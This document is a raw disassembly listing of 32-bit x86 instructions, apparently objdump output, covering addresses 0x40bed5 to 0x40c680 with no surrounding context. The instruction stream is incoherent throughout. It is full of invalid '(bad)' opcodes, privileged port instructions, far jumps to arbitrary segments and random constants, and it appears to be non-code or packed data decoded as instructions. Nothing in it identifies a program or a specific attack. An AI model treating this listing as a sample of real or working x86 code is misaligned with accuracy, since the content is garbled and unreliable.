  40bed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bed6:	je     0x40be95
  40bed8:	stos   DWORD PTR es:[edi],eax
  40bed9:	pop    ds
  40beda:	clc    
  40bedb:	mov    esi,0x13e81c21
  40bee0:	adc    DWORD PTR [ebp+0x1aefe],esp
  40bee6:	push   0xffffffe8
  40bee8:	mov    ebx,DWORD PTR [edi]
  40beea:	hlt    
  40beeb:	sahf   
  40beec:	add    DWORD PTR [edi+eiz*8-0x15a87e1],ebp
  40bef3:	mov    fs,WORD PTR [ecx-0x54]
  40bef6:	out    0x0,eax
  40bef8:	mov    ah,0xf7
  40befa:	(bad)  
  40befb:	push   eax
  40befd:	sldt   WORD PTR [eax]
  40bf00:	mov    BYTE PTR [ebp+0x3],dh
  40bf03:	mov    eax,0x1098
  40bf08:	inc    ecx
  40bf09:	iret   
  40bf0a:	push   cs
  40bf0b:	add    ch,al
  40bf0d:	xchg   ebp,eax
  40bf0e:	jmp    0x7ec:0xb000056
  40bf15:	add    BYTE PTR [ebp+0x1ac95e13],al
  40bf1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf1c:	dec    BYTE PTR [edx+0xaeb18a5]
  40bf22:	pop    ds
  40bf23:	mov    ds:0x6971b9e6,eax
  40bf28:	std    
  40bf29:	adc    DWORD PTR [esi],0xffffffa5
  40bf2c:	cmp    DWORD PTR [esi],0xfff0e348
  40bf32:	xchg   ebp,eax
  40bf33:	sbb    al,ch
  40bf35:	test   eax,0x5efd5eb1
  40bf3a:	popa   
  40bf3b:	fld    DWORD PTR [edx]
  40bf3d:	add    ch,al
  40bf3f:	xchg   edx,eax
  40bf40:	jmp    0xec55:0x8b0fc58b
  40bf47:	xchg   edx,eax
  40bf48:	add    dl,BYTE PTR [eax+0xfeb9b]
  40bf4e:	fs adc eax,0x5cf8558b
  40bf54:	cs (bad) 
  40bf56:	ficomp DWORD PTR [eax-0xc27eb85]
  40bf5c:	pop    es
  40bf5d:	mov    eax,DWORD PTR [ebp+0x4]
  40bf60:	push   DWORD PTR [eax-0x3c]
  40bf63:	mov    WORD PTR [eax],es
  40bf65:	sbb    DWORD PTR ds:0xc1740000,0xffffff90
  40bf6c:	push   ebx
  40bf6d:	sbb    al,bh
  40bf6f:	mov    WORD PTR [eax],es
  40bf71:	xor    DWORD PTR [ecx],0xffffffaf
  40bf74:	or     cl,cl
  40bf76:	add    BYTE PTR [eax],al
  40bf78:	jae    0x40bf23
  40bf7a:	add    dl,BYTE PTR [ebp-0x46]
  40bf7d:	mov    DWORD PTR [ebx+eax*8-0x74adf583],eax
  40bf84:	in     al,dx
  40bf85:	mov    esp,0xad8effbf
  40bf8a:	add    al,BYTE PTR [eax]
  40bf8c:	mov    edx,0x31c70670
  40bf91:	lods   eax,DWORD PTR ds:[esi]
  40bf92:	add    al,BYTE PTR [eax]
  40bf94:	xor    DWORD PTR [esi],ebp
  40bf96:	aaa    
  40bf97:	or     BYTE PTR [ecx],dh
  40bf99:	enter  0x2b0a,0x71
  40bf9d:	jnp    0x40bff6
  40bf9f:	leave  
  40bfa0:	jae    0x40bf53
  40bfa2:	add    bh,bh
  40bfa4:	fdiv   QWORD PTR [edx+ebp*4-0x470e2e01]
  40bfab:	or     dh,BYTE PTR [ecx-0x80]
  40bfae:	or     ch,BYTE PTR [ebx]
  40bfb0:	jno    0x40c015
  40bfb2:	push   edi
  40bfb3:	leave  
  40bfb4:	jae    0x40bf6f
  40bfb6:	add    cl,BYTE PTR [ecx+0x74b90574]
  40bfbc:	cmp    DWORD PTR ds:0xa21e630e,eax
  40bfc2:	mov    edi,0x2ac1d44
  40bfc7:	add    BYTE PTR [ecx],dh
  40bfc9:	inc    eax
  40bfca:	aas    
  40bfcb:	in     al,dx
  40bfcc:	popa   
  40bfcd:	sub    BYTE PTR [esi],bh
  40bfcf:	hlt    
  40bfd0:	popa   
  40bfd1:	ret    0x82d
  40bfd4:	or     DWORD PTR [edx-0x44],esp
  40bfd7:	(bad)  
  40bfd8:	out    dx,al
  40bfd9:	add    edi,DWORD PTR [edi]
  40bfdb:	in     al,dx
  40bfdc:	add    BYTE PTR [eax],al
  40bfde:	pop    esi
  40bfdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfe0:	cmp    DWORD PTR [ebp+eiz*8-0x54],0x2e
  40bfe5:	add    al,0x2a
  40bfe7:	jg     0x40c017
  40bfe9:	or     BYTE PTR [edx],bl
  40bfeb:	ins    DWORD PTR es:[edi],dx
  40bfec:	pop    eax
  40bfed:	pop    edi
  40bfee:	clc    
  40bfef:	adc    ebp,DWORD PTR [ebx+0x23ef3107]
  40bff5:	test   al,0xa9
  40bff7:	pop    eax
  40bff8:	add    DWORD PTR [edx+0x3e8ac2d],0xbff13d1
  40c002:	dec    edx
  40c003:	aam    0x1e
  40c005:	pop    ecx
  40c006:	push   0xba03e4d5
  40c00b:	pop    eax
  40c00c:	add    edx,0xabb91566
  40c012:	mov    DWORD PTR [ebx],ebp
  40c014:	pop    esi
  40c015:	mov    eax,0x8c5558a9
  40c01a:	data16 fisub DWORD PTR [ebx-0x175d9961]
  40c021:	add    ecx,DWORD PTR [edx-0x1a]
  40c024:	imul   edi,DWORD PTR [esi],0x61
  40c027:	inc    ebx
  40c028:	fs ds inc ebp
  40c02b:	inc    ebx
  40c02c:	cs cmp DWORD PTR cs:[ebp+eiz*4+0x71a23fbd],ebp
  40c035:	inc    esi
  40c036:	inc    ecx
  40c037:	fisub  WORD PTR [ebx-0x1de75855]
  40c03d:	aad    0xa2
  40c03f:	add    al,0x6
  40c041:	add    BYTE PTR cs:[eax],al
  40c044:	sbb    eax,0x162b48ad
  40c049:	mov    ds:0x416cc3c1,al
  40c04e:	and    ch,al
  40c050:	cmp    dl,BYTE PTR [eax+edx*1]
  40c053:	dec    ecx
  40c054:	or     DWORD PTR [edx-0x6a345fdd],esp
  40c05a:	push   ebx
  40c05b:	lods   al,BYTE PTR ds:[esi]
  40c05c:	out    dx,al
  40c05d:	daa    
  40c05e:	out    0x82,eax
  40c060:	gs test al,0xe8
  40c063:	xor    al,dh
  40c065:	xchg   ebp,eax
  40c066:	cmp    ebp,DWORD PTR [esi+edx*8-0x4c10ffd8]
  40c06d:	and    ah,dh
  40c06f:	jmp    0x1d3fc475
  40c074:	jns    0x40c02f
  40c076:	jo     0x40c089
  40c078:	jle    0x40c01c
  40c07a:	sub    ch,BYTE PTR [ecx-0x5436bef9]
  40c080:	cmp    DWORD PTR [ebx+eax*4],edx
  40c083:	add    al,0xd1
  40c085:	mov    eax,ds:0x8ec5e473
  40c08a:	(bad)  
  40c08b:	call   0xd9854dc2
  40c090:	mov    edi,0x3576e428
  40c095:	lea    eax,[ebp+eax*2+0x6c]
  40c099:	rol    DWORD PTR [ecx],0xb9
  40c09c:	call   0x448c:0x9e4e6834
  40c0a3:	and    eax,0x72dc20aa
  40c0a8:	add    BYTE PTR [eax],al
  40c0aa:	and    BYTE PTR [eax-0x72266e16],ah
  40c0b0:	iret   
  40c0b1:	es lock mov bl,0xff
  40c0b5:	call   0xa4cdd4ec
  40c0ba:	xchg   edx,eax
  40c0bb:	push   ecx
  40c0bc:	lea    ebp,[esi+ebx*8+0x600e5250]
  40c0c3:	or     al,0xe8
  40c0c5:	push   ss
  40c0c6:	fisub  DWORD PTR [ecx+0x24f2f2fe]
  40c0cc:	or     al,0x6a
  40c0ce:	dec    eax
  40c0cf:	test   al,0xff
  40c0d1:	je     0x40c0d7
  40c0d3:	xchg   esi,eax
  40c0d4:	jl     0x40c09f
  40c0d6:	xor    ah,BYTE PTR [edi]
  40c0d8:	es push 0x39
  40c0db:	mov    ah,0xff
  40c0dd:	pop    esp
  40c0de:	cmp    eax,0x9ac974a1
  40c0e3:	push   ss
  40c0e4:	push   0xfd69f700
  40c0e9:	jne    0x40c09f
  40c0eb:	ins    BYTE PTR es:[edi],dx
  40c0ec:	sub    dh,bh
  40c0ee:	xchg   DWORD PTR [ecx-0x3],ebp
  40c0f1:	jne    0x40c087
  40c0f3:	ins    BYTE PTR es:[edi],dx
  40c0f4:	hlt    
  40c0f5:	addr16 xchg edi,eax
  40c0f7:	imul   ebp,DWORD PTR [ecx],0xc948f6c0
  40c0fd:	ret    0x1494
  40c100:	mov    eax,DWORD PTR [ebp-0x48]
  40c103:	sub    eax,0x95ac4dfe
  40c108:	jnp    0x40c0ee
  40c10a:	mov    al,dh
  40c10c:	add    eax,0x85000083
  40c111:	jo     0x40c111
  40c113:	je     0x40c109
  40c115:	lea    eax,[ebx+0xc]
  40c118:	pop    ss
  40c119:	in     al,0xdb
  40c11b:	(bad)
  40c11f:	cld    
  40c120:	lock int 0x65
  40c123:	push   edi
  40c125:	sbb    al,0x0
  40c127:	add    BYTE PTR [eax+0x14],cl
  40c12a:	pop    esi
  40c12b:	pop    edi
  40c12c:	and    ebx,edx
  40c12e:	or     al,BYTE PTR [eax]
  40c130:	lods   eax,DWORD PTR ds:[esi]
  40c131:	(bad)  
  40c132:	jmp    0x9583:0x55cd0c83
  40c139:	add    al,0x0
  40c13b:	jne    0x40c17f
  40c13d:	sbb    al,0x0
  40c13f:	add    BYTE PTR [eax],bl
  40c141:	adc    al,0x5f
  40c143:	leave  
  40c144:	pop    edx
  40c145:	(bad)  
  40c147:	jmp    ebp
  40c149:	add    ebp,DWORD PTR [ebx]
  40c14b:	shl    BYTE PTR [ebx-0x208efac],cl
  40c151:	das    
  40c152:	gs inc ecx
  40c154:	sbb    BYTE PTR [ecx+0x1862f043],dl
  40c15a:	push   DWORD PTR [ebp-0x28]
  40c15d:	imul   esi,DWORD PTR [ebx+0x8],0x5f19d531
  40c164:	out    0xce,al
  40c166:	cmp    BYTE PTR [ecx+eax*2-0x53],0x2d
  40c16b:	or     al,0x4b
  40c16d:	lods   al,BYTE PTR ds:[esi]
  40c16e:	sub    BYTE PTR [esi+ecx*8-0x20],ah
  40c172:	or     ebp,eax
  40c174:	add    BYTE PTR [eax],al
  40c176:	cmp    DWORD PTR [esi],ecx
  40c178:	mov    ch,0xfe
  40c17a:	mov    esi,0x3cff1000
  40c17f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c180:	stos   BYTE PTR es:[edi],al
  40c181:	dec    edx
  40c182:	adc    eax,DWORD PTR [esi-0x6f13774c]
  40c188:	mov    ah,0x74
  40c18a:	inc    ebp
  40c18b:	xchg   esi,eax
  40c18c:	or     BYTE PTR cs:[ecx-0x7100df43],cl
  40c193:	es das 
  40c195:	adc    al,0x86
  40c197:	test   al,0xa
  40c199:	call   0xfef48cd2
  40c19e:	test   al,0x78
  40c1a0:	mov    edx,0xb3a0e4fe
  40c1a5:	je     0x40c1e0
  40c1a7:	push   ebp
  40c1a8:	lods   eax,DWORD PTR ds:[esi]
  40c1a9:	pusha  
  40c1aa:	pop    esi
  40c1ab:	push   esi
  40c1ac:	mov    ch,0x74
  40c1ae:	cmp    eax,0x59082ede
  40c1b3:	les    esp,FWORD PTR [eax]
  40c1b5:	inc    DWORD PTR [esi+0x32]
  40c1b8:	aas    
  40c1b9:	adc    al,0xb2
  40c1bb:	mov    ch,0x2
  40c1bd:	je     0x40c1e4
  40c1bf:	sub    dh,BYTE PTR [edi]
  40c1c1:	cld    
  40c1c2:	cmp    al,0x81
  40c1c4:	add    eax,0xff11a483
  40c1c9:	jae    0x40c201
  40c1cb:	ret    0x5ec2
  40c1ce:	call   0xd040d1bd
  40c1d3:	loopne 0x40c1f2
  40c1d5:	inc    ecx
  40c1d6:	xor    esp,edi
  40c1d8:	stos   DWORD PTR es:[edi],eax
  40c1d9:	cmp    BYTE PTR [eax],al
  40c1db:	add    BYTE PTR [esp+edx*1-0x1f],dh
  40c1df:	sub    eax,0x54a8eb2e
  40c1e4:	clc    
  40c1e5:	sar    esp,1
  40c1e7:	add    esi,DWORD PTR [edx+0x65fecd20]
  40c1ed:	push   cs
  40c1ee:	(bad)  
  40c1ef:	cs cmp eax,0xd90c339f
  40c1f5:	xchg   esp,eax
  40c1f6:	inc    edi
  40c1f7:	mov    ch,0xc7
  40c1f9:	mov    WORD PTR [ebx],fs
  40c1fb:	int3   
  40c1fc:	push   esi
  40c1fd:	adc    al,0xe9
  40c1ff:	add    dh,BYTE PTR [ecx]
  40c201:	lods   al,BYTE PTR ds:[esi]
  40c202:	in     eax,0x1c
  40c204:	scas   al,BYTE PTR es:[edi]
  40c205:	sahf   
  40c206:	pop    edi
  40c207:	ds popf 
  40c209:	jmp    0xffb:0x9f40a88d
  40c210:	xchg   esi,eax
  40c211:	sub    cl,dh
  40c213:	stos   DWORD PTR es:[edi],eax
  40c214:	mov    esp,0xbbb47634
  40c219:	dec    eax
  40c21a:	jne    0x40c1a6
  40c21c:	xor    bl,BYTE PTR [edx-0x53]
  40c21f:	clc    
  40c220:	cmc    
  40c221:	fisubr DWORD PTR [edx-0x7f02a745]
  40c228:	push   ds
  40c229:	adc    al,0xd4
  40c22b:	add    al,0x5e
  40c22d:	sub    BYTE PTR ds:0x3e3570ab,bh
  40c233:	mov    ah,0x1b
  40c235:	aam    0x95
  40c237:	retf   0x770
  40c23a:	jmp    0xebe07fbf
  40c23f:	add    al,0x0
  40c241:	add    BYTE PTR [esi+esi*2-0x16cefc18],ch
  40c248:	adc    eax,0xb38994a8
  40c24d:	scas   eax,DWORD PTR es:[edi]
  40c24e:	stos   DWORD PTR es:[edi],eax
  40c24f:	sbb    BYTE PTR [ebx+0x0],al
  40c252:	ins    BYTE PTR es:[edi],dx
  40c253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c254:	xchg   edx,eax
  40c255:	add    esp,DWORD PTR [ecx-0x63]
  40c258:	(bad)  
  40c259:	jnp    0x40c295
  40c25b:	lods   al,BYTE PTR ds:[esi]
  40c25c:	daa    
  40c25d:	pop    ebp
  40c25f:	sahf   
  40c260:	(bad)  
  40c261:	pop    esp
  40c262:	sbb    DWORD PTR [ebp+0x3caf174],ebx
  40c268:	popa   
  40c269:	(bad)  
  40c26a:	mov    ds:0x3f9d448c,al
  40c26f:	adc    al,0xff
  40c271:	cmp    al,0x39
  40c273:	popf   
  40c274:	je     0x40c267
  40c276:	stos   BYTE PTR es:[edi],al
  40c277:	dec    esp
  40c278:	clc    
  40c279:	mov    dh,0x82
  40c27b:	mov    cl,BYTE PTR [ebp+edx*8-0x49]
  40c27f:	fdiv   st(7),st
  40c281:	sbb    esi,DWORD PTR [edx]
  40c283:	popf   
  40c284:	je     0x40c21b
  40c286:	int    0x2f
  40c288:	xchg   si,ax
  40c28a:	loop   0x40c276
  40c28c:	mov    edi,0x13d3dc2e
  40c291:	jmp    0x7e58eb79
  40c296:	dec    eax
  40c297:	or     bh,bh
  40c299:	cld    
  40c29a:	(bad)  
  40c29b:	sahf   
  40c29c:	je     0x40c27b
  40c29e:	ret    
  40c29f:	sub    BYTE PTR [eax],cl
  40c2a1:	push   ecx
  40c2a2:	sahf   
  40c2a3:	lahf   
  40c2a4:	(bad)  
  40c2a5:	pop    esi
  40c2a6:	add    BYTE PTR [eax],al
  40c2a8:	outs   dx,BYTE PTR ds:[esi]
  40c2a9:	pop    ebp
  40c2aa:	je     0x40c292
  40c2ac:	mov    ds:0xea41f428,eax
  40c2b1:	xor    eax,0x5d7646ff
  40c2b6:	pop    esi
  40c2b7:	xor    BYTE PTR [edi+0x1],dh
  40c2ba:	add    BYTE PTR [esi-0x4407dfa9],ch
  40c2c0:	mov    cl,0x9e
  40c2c2:	je     0x40c2c5
  40c2c4:	sub    BYTE PTR [eax],0x14
  40c2c7:	push   ds
  40c2c8:	push   0x269cfecc
  40c2cd:	sahf   
  40c2ce:	je     0x40c2b1
  40c2d0:	mov    edx,0x2f00fe36
  40c2d5:	popa   
  40c2d6:	or     eax,eax
  40c2d8:	pop    ds
  40c2d9:	mov    WORD PTR [eax+0x1],ss
  40c2dc:	sbb    BYTE PTR [ecx],dl
  40c2de:	push   DWORD PTR [ebp+0x4]
  40c2e1:	jns    0x40c2f7
  40c2e3:	punpckldq xmm5,XMMWORD PTR [ecx]
  40c2e7:	shr    BYTE PTR [edi],0x5f
  40c2ea:	rcl    BYTE PTR [eax+ebx*8],0x7f
  40c2ee:	cmp    al,0x1
  40c2f0:	enter  0x8310,0x7d
  40c2f4:	in     al,dx
  40c2f5:	adc    ecx,DWORD PTR [edi]
  40c2f7:	test   esp,eax
  40c2f9:	pop    ss
  40c2fa:	add    BYTE PTR [eax],al
  40c2fc:	xor    esp,DWORD PTR [ecx-0x19]
  40c2ff:	and    al,0xc9
  40c301:	adc    BYTE PTR [eax],al
  40c303:	mov    esi,ebp
  40c305:	pop    ebx
  40c306:	mov    DWORD PTR [edx+edx*1],eax
  40c309:	push   ss
  40c30a:	inc    ebp
  40c30b:	lock add BYTE PTR [eax],al
  40c30e:	xor    bl,BYTE PTR [eax]
  40c310:	push   eax
  40c311:	inc    DWORD PTR [ebp-0x60]
  40c314:	out    0x74,al
  40c316:	dec    ebp
  40c317:	popa   
  40c318:	std    
  40c319:	push   0xffffff98
  40c31b:	popa   
  40c31c:	jae    0x40c332
  40c31e:	(bad)  
  40c31f:	fild   DWORD PTR [edi]
  40c321:	call   0x3e1d11
  40c326:	add    edx,DWORD PTR [esp+edx*1-0x7d]
  40c32a:	adc    DWORD PTR [eax],ebx
  40c32c:	jne    0x40c33d
  40c32e:	(bad)  
  40c32f:	fcomi  st,st(3)
  40c331:	call   0x3faf46
  40c336:	inc    ebx
  40c337:	fcomp  DWORD PTR [ebp-0x37]
  40c33a:	sbb    al,BYTE PTR ds:0xe52a0b00
  40c340:	add    al,0xe9
  40c342:	cld    
  40c343:	adc    BYTE PTR [eax],al
  40c345:	add    cl,al
  40c347:	dec    ebx
  40c348:	in     al,dx
  40c349:	push   0x18
  40c34b:	addr16 jae 0x40c362
  40c34e:	xor    DWORD PTR [edx],eax
  40c350:	cmp    BYTE PTR [eax],cl
  40c352:	or     DWORD PTR [edi-0x47],edi
  40c355:	(bad)  
  40c356:	push   ss
  40c357:	daa    
  40c358:	inc    eax
  40c359:	adc    al,0xb2
  40c35b:	aam    0x2
  40c35d:	jne    0x40c395
  40c35f:	mov    ds:0x4609f436,al
  40c364:	sub    bh,bh
  40c366:	test   BYTE PTR [esi],0xc4
  40c369:	pop    esi
  40c36a:	clc    
  40c36b:	outs   dx,DWORD PTR ds:[esi]
  40c36c:	pop    ss
  40c36d:	add    dh,ah
  40c36f:	clc    
  40c370:	ja     0x40c3d7
  40c372:	add    BYTE PTR [eax],al
  40c374:	jo     0x40c323
  40c376:	jg     0x40c3bc
  40c378:	leave  
  40c379:	es inc edi
  40c37b:	call   0xc1408932
  40c380:	shr    DWORD PTR [eax+0x6a78d1db],1
  40c386:	add    eax,DWORD PTR [eax]
  40c388:	xor    DWORD PTR [edx-0x4e],edi
  40c38b:	sbb    BYTE PTR [ecx-0x6ebb865e],0x2e
  40c392:	pop    ds
  40c393:	call   0xec87f9ea
  40c398:	pop    edx
  40c399:	call   0x86743a39
  40c39e:	fisubr DWORD PTR [edx]
  40c3a0:	arpl   WORD PTR [esi],si
  40c3a2:	inc    edi
  40c3a3:	in     al,dx
  40c3a4:	dec    edx
  40c3a5:	lock mov ds:0x8544e48a,eax
  40c3ab:	rcl    BYTE PTR [edx],0x2e
  40c3ae:	fwait
  40c3af:	add    ebx,DWORD PTR [esi+0x3c]
  40c3b2:	add    eax,0x57345155
  40c3b7:	in     al,0xaa
  40c3b9:	push   0x50f43a9a
  40c3be:	xor    eax,0xa268ba05
  40c3c3:	jmp    0x1436:0xe4473632
  40c3ca:	pushf  
  40c3cb:	pop    ss
  40c3cc:	and    DWORD PTR cs:0xe1212654,ecx
  40c3d3:	fwait
  40c3d4:	shl    DWORD PTR [edx+0xb10d],1
  40c3da:	sub    edx,esp
  40c3dc:	jnp    0x40c3de
  40c3de:	push   cs
  40c3df:	and    ebp,esi
  40c3e1:	fwait
  40c3e2:	and    al,0x31
  40c3e4:	div    BYTE PTR [eax-0x45722bb5]
  40c3ea:	lock (bad) 
  40c3ec:	call   0x71f9396b
  40c3f1:	shl    DWORD PTR [ebp-0x53ac42b0],cl
  40c3f7:	push   eax
  40c3f8:	mov    cl,0x53
  40c3fa:	sub    DWORD PTR [edx+eiz*2+0x6f9acfac],0x46
  40c402:	loope  0x40c39e
  40c404:	cmp    edx,eax
  40c406:	(bad)  
  40c407:	xor    DWORD PTR ds:0x2396b7b1,ecx
  40c40d:	aam    0xae
  40c40f:	es cld 
  40c411:	test   BYTE PTR ds:0x4637e8bc,ah
  40c417:	fwait
  40c418:	adc    ebx,eax
  40c41a:	xchg   edi,eax
  40c41b:	and    BYTE PTR [ecx+0x7e0805b0],ah
  40c421:	cmp    DWORD PTR ss:[ebx+0x207e0c1b],ebx
  40c428:	xchg   ecx,eax
  40c429:	fwait
  40c42a:	xor    BYTE PTR [edi-0x21084f9b],bl
  40c430:	fld    TBYTE PTR [ebx-0x4ec669c9]
  40c436:	pop    edi
  40c437:	call   0x272c:0xab5d364d
  40c43e:	add    BYTE PTR [eax],al
  40c440:	dec    esi
  40c441:	call   0xe900:0x14310280
  40c448:	loope  0x40c416
  40c44a:	rcl    ebp,0x32
  40c44d:	inc    ecx
  40c44e:	mov    edx,DWORD PTR ds:0xf1749989
  40c454:	retf   0x71a5
  40c457:	push   ss
  40c458:	loope  0x40c48b
  40c45a:	out    dx,al
  40c45b:	stos   BYTE PTR es:[edi],al
  40c45c:	jae    0x40c472
  40c45e:	(bad)  
  40c45f:	jl     0x40c46b
  40c461:	mov    dl,0x3c
  40c463:	mov    dh,0x32
  40c465:	adc    al,0xb
  40c467:	sub    DWORD PTR [edi+0xf],eax
  40c46a:	pop    edi
  40c46b:	and    ah,ch
  40c46d:	adc    DWORD PTR [eax],eax
  40c46f:	scas   eax,DWORD PTR es:[edi]
  40c470:	xor    eax,0xe554ff14
  40c475:	mov    cl,0xd2
  40c477:	pop    ebx
  40c478:	mov    ds,WORD PTR [edx+0x5372d9be]
  40c47e:	add    dh,al
  40c480:	or     BYTE PTR [edi+edx*2],cl
  40c483:	shr    DWORD PTR [edx+eiz*8],1
  40c486:	(bad)  
  40c487:	call   0xe4b51e47
  40c48c:	addr16 retf 
  40c48e:	shl    ecx,0x32
  40c491:	cwde   
  40c492:	xor    ch,BYTE PTR [ecx-0x690165ec]
  40c498:	into   
  40c499:	mov    ds:0x1f2fd1ad,eax
  40c49e:	loopne 0x40c426
  40c4a0:	dec    eax
  40c4a1:	or     al,0xe8
  40c4a3:	add    eax,0x99880000
  40c4a8:	(bad)  
  40c4a9:	loop   0x40c51d
  40c4ab:	and    BYTE PTR ds:0x7d3b40e,al
  40c4b1:	jmp    0xa884b900
  40c4b6:	xor    bl,BYTE PTR [ecx-0x32451e8c]
  40c4bc:	xor    al,0xe9
  40c4be:	xor    cl,BYTE PTR ds:0x988d00c0
  40c4c4:	std    
  40c4c5:	jne    0x40c51b
  40c4c7:	sbb    al,BYTE PTR [esp+edi*4]
  40c4ca:	outs   dx,BYTE PTR ds:[esi]
  40c4cb:	push   eax
  40c4cc:	add    BYTE PTR [eax+0x33],ch
  40c4cf:	dec    esp
  40c4d0:	inc    ecx
  40c4d1:	add    BYTE PTR [edi-0x25],dl
  40c4d4:	pop    es
  40c4d5:	call   0x3f6064
  40c4da:	adc    edx,ebp
  40c4dc:	jae    0x40c4e7
  40c4de:	daa    
  40c4df:	fisttp DWORD PTR [ebx]
  40c4e1:	(bad)  
  40c4e2:	sbb    eax,0x184164d5
  40c4e7:	std    
  40c4e8:	cmp    DWORD PTR [ecx+ecx*8+0x14],eax
  40c4ec:	push   DWORD PTR [ebp+0x10]
  40c4ef:	jge    0x40c487
  40c4f1:	xor    eax,0xc00b14d8
  40c4f6:	jge    0x40c48f
  40c4f8:	std    
  40c4f9:	jne    0x40c4cf
  40c4fb:	sbb    DWORD PTR [esp+eax*8],eax
  40c4fe:	outs   dx,BYTE PTR ds:[esi]
  40c4ff:	dec    edi
  40c500:	add    BYTE PTR [eax+0x14d9],bh
  40c506:	daa    
  40c507:	push   edi
  40c508:	ror    BYTE PTR [eax],0x0
  40c50b:	add    al,cl
  40c50d:	cmp    ecx,DWORD PTR [ebx-0xd2eb414]
  40c513:	push   esi
  40c514:	outs   dx,DWORD PTR ds:[esi]
  40c515:	clc    
  40c516:	jmp    0xff511e5e
  40c51b:	jne    0x40c4ad
  40c51d:	jl     0x40c4a3
  40c51f:	mov    BYTE PTR ss:[ebx+ecx*1],dl
  40c523:	ror    BYTE PTR [ebp-0x3ea1a0f2],0xd2
  40c52a:	add    al,BYTE PTR [eax]
  40c52c:	dec    eax
  40c52d:	sbb    eax,0x9c858bef
  40c532:	jmp    0x3cd58138
  40c537:	add    BYTE PTR [ebp+0x6a],bh
  40c53a:	mov    ds:0x424f3168,al
  40c53f:	inc    ecx
  40c540:	xor    DWORD PTR [edx+0x38],ecx
  40c543:	or     BYTE PTR [ecx-0x36],bl
  40c546:	hlt    
  40c547:	inc    DWORD PTR [esi-0x5b]
  40c54a:	ret    0x3774
  40c54d:	or     BYTE PTR [ecx+ecx*8+0x73],0xae
  40c552:	add    cl,BYTE PTR [ebx+0x2199a5ac]
  40c558:	mov    cl,0xb6
  40c55a:	sti    
  40c55b:	jae    0x40c595
  40c55d:	sub    eax,0xa19d0cee
  40c562:	cmp    BYTE PTR [esi],0x3b
  40c565:	sbb    esi,edi
  40c567:	jg     0x40c5af
  40c569:	jb     0x40c5a1
  40c56b:	or     dh,BYTE PTR [ecx+0x744f5e]
  40c571:	add    BYTE PTR [ebp*1-0x559ba012],ch
  40c578:	les    eax,FWORD PTR [esi]
  40c57a:	adc    esi,ebp
  40c57c:	cmp    DWORD PTR [esi],0x31
  40c57f:	cmp    bl,cl
  40c581:	(bad)  
  40c582:	ins    BYTE PTR es:[edi],dx
  40c583:	leave  
  40c584:	add    eax,DWORD PTR [eax]
  40c586:	xor    DWORD PTR [ebp-0x5236bb3d],ebp
  40c58c:	add    al,BYTE PTR [eax]
  40c58e:	xor    DWORD PTR [edx],esi
  40c590:	das    
  40c591:	or     dl,cl
  40c593:	repnz cmp DWORD PTR [esi],0x56
  40c597:	clc    
  40c598:	fadd   DWORD PTR [edx+0x75037924]
  40c59e:	inc    ebx
  40c59f:	jbe    0x40c5e7
  40c5a1:	clc    
  40c5a2:	xor    BYTE PTR [ebp-0x4efbfffe],ch
  40c5a8:	ret    
  40c5a9:	inc    esp
  40c5aa:	test   DWORD PTR [edx+eax*1+0x10923100],ebp
  40c5b1:	imul   esp
  40c5b3:	and    al,0x3
  40c5b5:	add    BYTE PTR [ecx],dh
  40c5b7:	adc    al,0xe9
  40c5b9:	ss cmp ecx,esi
  40c5bc:	in     eax,0xe3
  40c5be:	ja     0x40c611
  40c5c0:	push   ebp
  40c5c1:	add    al,0x31
  40c5c3:	adc    al,0xe9
  40c5c5:	or     DWORD PTR [edi],0x38
  40c5c8:	mov    esp,0x41514606
  40c5cd:	cdq    
  40c5ce:	aaa    
  40c5cf:	iret   
  40c5d0:	stos   DWORD PTR es:[edi],eax
  40c5d1:	stos   DWORD PTR es:[edi],eax
  40c5d2:	ss xchg edi,eax
  40c5d4:	call   0xb240c5dc
  40c5d9:	sbb    BYTE PTR ds:0x27139c03,ah
  40c5df:	add    eax,0xed694f51
  40c5e4:	push   ss
  40c5e5:	and    BYTE PTR [ecx+0x79],bl
  40c5e8:	lea    ecx,[edx+edx*1]
  40c5eb:	adc    BYTE PTR [ecx+0x2736c8d6],dh
  40c5f1:	xchg   esp,eax
  40c5f2:	jne    0x40c5f6
  40c5f4:	push   ecx
  40c5f5:	and    ecx,ebx
  40c5f7:	push   esp
  40c5f8:	fimul  DWORD PTR ds:0x8c304473
  40c5fe:	in     eax,0x44
  40c600:	mov    cl,0xd6
  40c602:	call   0x1e77a23d
  40c607:	inc    ebp
  40c608:	mov    cl,0xd6
  40c60a:	call   0x240fac45
  40c60f:	mov    eax,0x3e896be
  40c614:	stos   BYTE PTR es:[edi],al
  40c615:	and    cl,ah
  40c617:	js     0x40c646
  40c619:	or     al,0x92
  40c61b:	loope  0x40c643
  40c61d:	xlat   BYTE PTR ds:[ebx]
  40c61e:	int3   
  40c61f:	ss cmp eax,0x9603edce
  40c625:	and    BYTE PTR [ebp-0x791566ab],dl
  40c62b:	lods   al,BYTE PTR ds:[esi]
  40c62c:	xchg   DWORD PTR [edx],ecx
  40c62e:	test   eax,0x373736
  40c633:	pop    ss
  40c634:	mov    edx,0xe9e903d4
  40c639:	popf   
  40c63a:	inc    ebp
  40c63b:	data16 add BYTE PTR [eax],al
  40c63e:	out    dx,eax
  40c63f:	lahf   
  40c640:	inc    esi
  40c641:	imul   ecx,DWORD PTR [ebp-0x6a],0x1f853073
  40c648:	hlt    
  40c649:	mov    bh,0xaa
  40c64b:	or     bh,dh
  40c64d:	inc    esi
  40c64e:	xchg   ebp,eax
  40c64f:	xor    eax,0x1270305e
  40c654:	add    BYTE PTR [ecx+edi*4-0x15da7d56],bl
  40c65b:	aas    
  40c65c:	push   edi
  40c65d:	push   0x57
  40c65f:	add    BYTE PTR [eax],al
  40c661:	xchg   ebp,eax
  40c662:	sbb    edx,DWORD PTR [ebx+0x54fbd73c]
  40c668:	add    cl,ch
  40c66a:	inc    edi
  40c66b:	push   cs
  40c66c:	pop    edi
  40c66d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c66e:	retf   
  40c66f:	ror    DWORD PTR [edi],cl
  40c671:	jmp    0xb05516ef
  40c676:	das    
  40c677:	pop    eax
  40c678:	gs test al,0x32
  40c67b:	add    eax,0x142c8a83
  40c680:	add    BYTE PTR [eax],ah
